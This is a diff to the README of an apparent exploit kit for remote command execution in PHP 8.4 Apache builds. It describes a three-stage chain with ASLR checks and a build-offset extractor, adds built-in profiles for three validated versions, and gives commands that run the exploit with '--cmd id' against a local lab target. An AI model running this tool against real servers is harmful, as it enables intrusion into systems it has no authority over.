@@ -6,6 +6,8 @@ other builds and topologies with minimal manual steps:
 - `exploit_generic.py` — the full client: three-stage `display_errors=Off`
   chain, prefork worker parking, HTTP fingerprinting, memory_limit pad
   calibration, tolerant disclosure parsing and an early ASLR-draw check;
+  the three validated builds are also shipped as built-in profiles
+  (`--profile php-8.4.2{0,5,6}-amd64`) with their extraction provenance;
 - `libphp_offsets.py` — build-offset extractor for any `libphp.so`
   (pure-Python ELF parser, never executes the target binary);
 - `profiles/` — generated offset profiles for additional official builds.
@@ -43,14 +45,16 @@ Start a target with the usual lab scripts, then:
 python3 generic/exploit_generic.py --url http://127.0.0.1:9090/index.php \
   --host-header 127.0.0.1:8088 --fingerprint
 
-# 2. extract offsets for another official build
+# 2. validated builds (8.4.20 / 8.4.25 / 8.4.26): built-in profiles, no file needed
+python3 generic/exploit_generic.py --url http://127.0.0.1:9090/index.php \
+  --host-header 127.0.0.1:8088 --profile php-8.4.25-amd64 --cmd id -vv
+
+# 3. any other official build: extract offsets, then pass the profile file
 docker create --name tmp php:8.4.25-apache-bookworm
 docker cp tmp:/usr/lib/apache2/modules/libphp.so ./libphp.so
 docker rm tmp
 python3 generic/libphp_offsets.py ./libphp.so --php-version 8.4.25 \
   > generic/profiles/php-8.4.25-amd64.json
-
-# 3. full chain with that profile
 python3 generic/exploit_generic.py --url http://127.0.0.1:9090/index.php \
   --host-header 127.0.0.1:8088 --profile-json generic/profiles/php-8.4.25-amd64.json \
   --cmd id -vv
